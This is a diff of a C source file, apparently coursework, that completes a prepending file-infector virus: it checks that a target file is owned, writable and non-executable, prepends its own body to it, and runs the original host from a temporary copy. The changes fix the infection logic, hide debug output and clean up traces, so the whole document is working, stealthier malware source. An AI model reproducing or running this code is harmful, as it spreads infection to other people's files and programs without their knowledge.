@@ -1,5 +1,5 @@
 //@authors hhamilto, mjagbeke
-
+#define _GNU_SOURCE
 #include <stdlib.h>
 #include <stdio.h>
 #include <sys/types.h>
@@ -8,9 +8,10 @@
 #include <unistd.h>
 #include <strings.h>
 #include <unistd.h>
-
+#include <sys/wait.h>
 
 off_t sentinelOffset(int fd);
+int runHost(char* hostFile, char ** argv);
 
 int main(int argc, char** argv){
 	int thisFileFd, tmpHostFd, toInfectFd;
@@ -24,34 +25,40 @@ int main(int argc, char** argv){
 
 	//copy host to temp file
 	thisFileFd = open(argv[0], O_RDONLY);
-	sentinelOff = sentinelOffset(thisFileFd);
-	printf("Sentiel offset: %d\n",(int)sentinelOff);
 	getresuid(&ruid, &euid, &suid);
-	//copy host to temp file
 	sprintf(tmpHostFileName,"/tmp/host.%d", ruid);
 	tmpHostFd = open(tmpHostFileName, O_WRONLY|O_CREAT|O_EXCL, S_IXUSR);
 	if(tmpHostFd==-1){
 		//tmp host already exists
 		unlink(tmpHostFileName);
-		printf("tmp file existed\n");
-		return 0;
+		//printf("tmp file existed\n");
+		return 1;
 	}
 	//copy over host to tmp file
+	sentinelOff = sentinelOffset(thisFileFd);
 	lseek(thisFileFd, sentinelOff+4,SEEK_SET);
 	while(read(thisFileFd, &buf, 1)!=0){write(tmpHostFd,&buf,1);}
 	// determine whether arg1 is owned and can be written by the real uid of the 
 	// executing processs and does *not* have the owner group or world execute bit set
-	stat(argv[1],&arg1Stat);
-	if(   arg1Stat.st_uid == ruid &&
-	      arg1Stat.st_mode &(S_IWUSR) !=0 &&
-	      arg1Stat.st_mode &(S_IXUSR|S_IXGRP|S_IXOTH) == 0){
+	if(   argc>=2 &&
+	      stat(argv[1],&arg1Stat) != -1 &&
+	      arg1Stat.st_uid == ruid &&
+	      (arg1Stat.st_mode &(S_IWUSR)) != 0 &&
+	      (arg1Stat.st_mode &(S_IXUSR|S_IXGRP|S_IXOTH)) == 0){
 		toInfectFd = open(argv[1], O_RDWR);
-		if(sentinelOffset(toInfectFd) == -1)
+		if(sentinelOffset(toInfectFd) != -1){
+			//printf("host was already infected \n");
+			close(tmpHostFd);
+			close(thisFileFd);
+			close(toInfectFd);
 			return runHost(tmpHostFileName, argv);
+		}
 		//prepend virus
+		//printf("Prepending Virus\n");
 		//save arg file into buffer
 		arg1Buf = malloc(arg1Stat.st_size);
 		i = 0;
+		lseek(toInfectFd, 0, SEEK_SET);
 		while((i+=read(toInfectFd, arg1Buf+i, arg1Stat.st_size-i))<arg1Stat.st_size);
 		lseek(toInfectFd, 0, SEEK_SET);
 		lseek(thisFileFd, 0, SEEK_SET);
@@ -77,7 +84,7 @@ int main(int argc, char** argv){
 		close(toInfectFd);
 		return runHost(tmpHostFileName, argv);
 	}else{
-		printf("host was already infected\n");
+		//printf("argv[1] didn't seem legit to infect\n");
 		close(tmpHostFd);
 		close(thisFileFd);
 		return runHost(tmpHostFileName, argv);
@@ -85,17 +92,17 @@ int main(int argc, char** argv){
 }
 
 int runHost(char* hostFile, char ** argv){
-	printf("Running host: %s\n", hostFile);
+	//printf("Running host: %s\n", hostFile);
 	// fork, wait clean up temp file.
 	pid_t child;
 	int childStatus = -1;
-	if(child = fork()){
+	if((child = fork())){// you can thank the -Wall for the extra parens
 		wait(&childStatus);
 	}else{
 		execvp(hostFile, argv);
 		perror("Host failed to execvp: ");
 	}
-	//unlink(hostFile);
+	unlink(hostFile);
 	return childStatus;// return actual status from wait here.
 }
 
